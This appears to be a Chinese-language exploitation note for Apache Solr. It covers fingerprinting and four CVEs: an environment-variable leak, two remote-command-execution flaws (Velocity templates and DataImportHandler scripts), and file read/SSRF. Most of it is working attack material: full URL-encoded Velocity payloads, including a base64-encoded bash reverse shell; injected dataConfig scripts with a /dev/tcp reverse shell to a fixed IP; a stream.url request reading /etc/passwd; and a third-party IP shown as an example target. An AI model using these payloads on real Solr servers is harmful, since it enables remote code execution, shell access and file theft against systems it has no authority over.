Solr主要是基于HTTP和Apahce Lucene实现的全文搜索服务器

[Apache Solr漏洞总结（比较全面的哦）-CSDN博客](https://blog.csdn.net/yangbz123/article/details/117827547)

### 指纹

1.图标

2.端口：8983

### 环境变量信息泄漏漏洞(CVE-2023-50290)

##### 版本：

org.apache.solr:solr-core@[9.0.0, 9.3.0)

solr@[9.0.0, 9.3.0)

- 使用条件：

- 默认无认证或者具有metrics-read 权限

  如果不满足这种条件会需要用户名和密码

##### 利用

直接访问下面的链接即可

/solr/admin/metrics

![img](https://i-blog.csdnimg.cn/blog_migrate/19b4c2b0965efeaca6d24320b3fd4aef.png)

### 命令执行（CVE-2019-17558）

##### 版本

Apache Solr 5.0.0 ~8.3.1

##### 知识储备

默认情况下params.resource.loader.enabled配置未打开，无法使用自定义模板。

可以先通过如下API获取所有的核心，在vulhub中核心就是demo

通过下边API可以获取所有内核名称：http://118.193.36.37:8468/solr/admin/cores?indexInfo=false&wt=json

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/fc3bbccf3784bec8616e6fe70e9e0fd0.png)

比如是demo,访问http://your-ip:8983/solr/demo/config,用burp抓包修改改成POST然后修改启动配置，添加请求体params.resource.loader.enabled为true【启用配置 params.resource.loader.enabled 为true】

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/cf484ad84f6fe0e8ebc24f264efd09c6.png)

##### 利用

直接用脚本，手工如下

[CVE-2019-17558漏洞复现 - 冰淇淋干杯 - 博客园](https://www.cnblogs.com/Found404/p/14302902.html)

1.get请求目标路径，同时加入poc，比如是demo:

【修改exec(%27hostname%27)中的代码即可更改命令。】

```
/solr/demo/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27hostname%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end

```

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/87db223a911947c5f70ef4fbda8082a2.png)

------

反弹shell:

使用bash来反弹shell，但由于`Runtime.getRuntime().exec()`中不能使用管道符等bash需要的方法，我们需要用进行一次[编码](http://www.jackson-t.ca/runtime-exec-payloads.html)。

编码后将

bash -c
改为 bash%20-c%20
反弹shell
将 反弹shell命令用base64编码

```
/solr/demo/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27bash%20-c%20{echo%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMTkuMjkuNjcuNC85ODk3IDA%2BJjE%3D}|{base64%2C-d}|{bash%2C-i}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end
```



### 命令执行（CVE-2019-0193）

##### 知识储备

[【漏洞复现】Apache Solr 远程命令执行漏洞（CVE-2019-0193）_apache solr service exposed-CSDN博客](https://blog.csdn.net/weixin_45677119/article/details/111747307)

solr 中索引库用 **core** 表示

solr的 example/example-DIH ：可以作为solr的主目录，里面包含多个索引库，以及hsqldb的数据，里面有连接数据库的配置示例，以及邮件、rss的配置示例。

访问http://your-ip:8983/即可查看到Apache solr的管理页面，无需登录。
查看索引库test选择dataimport模块，选择开启debug模式，如果 solr 开启了debug，即debug=true，那么就可以通过 http 请求动态的指定dataConfig.xml 的内容了；

##### 版本

Apache Solr < 8.2.0

DataImportHandler功能开启，默认关闭

Apache solr的管理页面Solr Admin UI未开启鉴权认证

##### 原理：

DataImportHandler功能 在开启Debug模式时，可以接收来自请求的"dataConfig"参数，这个参数的功能与data-config.xml一样，不过是在开启Debug模式时方便通过此参数进行调试，并且Debug模式的开启是通过参数传入的。在dataConfig参数中可以包含script恶意脚本导致远程代码执行

##### 利用

1.在Apache solr的管理页面，点击Execute with this Confuguration，bp抓包

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/38c355efaeb5e0e9a66ad84c3ca014bc.png)

2.抓包后解码dataConfig字段（url解码）

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/ae0a49898e7e17fed05abda1abf6fe80.png)

解码结果如下：

```
<dataConfig>
    <dataSource driver="org.hsqldb.jdbcDriver" url="jdbc:hsqldb:${solr.install.dir}/example/example-DIH/hsqldb/ex" user="sa" />
    <document>
        <entity name="item" query="select * from item"
                deltaQuery="select id from item where last_modified > '${dataimporter.last_index_time}'">
            <field column="NAME" name="name" />

            <entity name="feature"  
                    query="select DESCRIPTION from FEATURE where ITEM_ID='${item.ID}'"
                    deltaQuery="select ITEM_ID from FEATURE where last_modified > '${dataimporter.last_index_time}'"
                    parentDeltaQuery="select ID from item where ID=${feature.ITEM_ID}">
                <field name="features" column="DESCRIPTION" />
            </entity>
            
            <entity name="item_category"
                    query="select CATEGORY_ID from item_category where ITEM_ID='${item.ID}'"
                    deltaQuery="select ITEM_ID, CATEGORY_ID from item_category where last_modified > '${dataimporter.last_index_time}'"
                    parentDeltaQuery="select ID from item where ID=${item_category.ITEM_ID}">
                <entity name="category"
                        query="select DESCRIPTION from category where ID = '${item_category.CATEGORY_ID}'"
                        deltaQuery="select ID from category where last_modified > '${dataimporter.last_index_time}'"
                        parentDeltaQuery="select ITEM_ID, CATEGORY_ID from item_category where CATEGORY_ID=${category.ID}">
                    <field column="DESCRIPTION" name="cat" />
                </entity>
            </entity>
        </entity>
    </document>
</dataConfig>

```

3.修改它的dataConfig字段，注入我们的POC
通过exec函数执行命令 `touch /tmp/success`，在系统的tmp目录下新建立一个名为：success的文件。

```
<dataConfig>
  <dataSource type="URLDataSource"/>
  <script><![CDATA[
          function poc(){ java.lang.Runtime.getRuntime().exec("touch /tmp/success");
          }
  ]]></script>
  <document>
    <entity name="stackoverflow"
            url="https://stackoverflow.com/feeds/tag/solr"
            processor="XPathEntityProcessor"
            forEach="/feed"
            transformer="script:poc" />
  </document>
</dataConfig>

```

4.重新编码后插入请求数据包中提交

或者直接在一开始debug-mod的表单里改

------

反弹shellpoc如下：

```
<dataConfig>
  <dataSource type="URLDataSource"/>
  <script><![CDATA[
          function poc(){ java.lang.Runtime.getRuntime().exec("/bin/bash >& /dev/tcp/192.168.40.131 1234 0>&1");
          }
  ]]></script>
  <document>
    <entity name="stackoverflow"
            url="https://stackoverflow.com/feeds/tag/solr"
            processor="XPathEntityProcessor"
            forEach="/feed"
            transformer="script:poc" />
  </document>
</dataConfig>

```

### 文件读取/SSRF(CVE-2021-27905)

##### 版本

Apache [Solr] <=8.8.1 (latest)

##### 利用

单纯利用curl命令读取文件：[CVE-2021-27905 Apache Solr 服务端请求伪造漏洞复现 - FreeBuf网络安全行业门户](https://www.freebuf.com/vuls/279278.html)

完整一点的：[CVE-2021-27905(Solr<=8.8.1文件读取与SSRF) - z-bool](https://z-bool.github.io/2022/10/21/cve-2021-27905/#3-1-获取core信息)

1.获取数据库名

```
http://your-ip:8983/solr/admin/cores?indexInfo=false&wt=json
```

![image-20221021005752087](https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221021005752087.png)

**获取数据库名** :`status.demo.name`所以此处的数据库名是`demo`

2.修改数据库配置，开启RemoteStreaming

Payload:

```
{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}
```

![image-20221021010657043](https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221021010657043.png)

3.读取任意文件

通过`stream.url`读取任意文件，访问`http://your-ip:8983/solr/demo/debug/dump?param=ContentStreams`，将请求包修改为POST请求

```
POST /solr/demo/debug/dump?param=ContentStreams
stream.url=file:///etc/passwd
```

![image-20221021011231357](https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221021011231357.png)

4.SSRF：

漏洞位置`/solr/demo/replication?command=fetchindex&masterUrl=(探测IP:端口)`